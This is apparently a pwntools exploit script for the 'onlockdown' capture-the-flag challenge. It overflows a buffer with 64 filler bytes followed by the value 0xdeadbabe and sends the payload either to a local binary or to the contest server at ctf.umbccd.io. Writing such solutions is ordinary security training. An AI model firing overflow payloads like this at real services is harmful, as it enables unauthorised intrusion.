from pwn import *

# Payload
overflow = b"a"
include = p32(0xdeadbabe)

def local():
    con = process('./onlockdown')
    con.recv().decode()
    con.sendline(overflow * 64 + include)
    print(con.recv().decode())

def nc():
    con = remote('ctf.umbccd.io', 4500)
    con.recv().decode()
    con.sendline(overflow * 64 + include)
    print(con.recv().decode())

# local()
nc()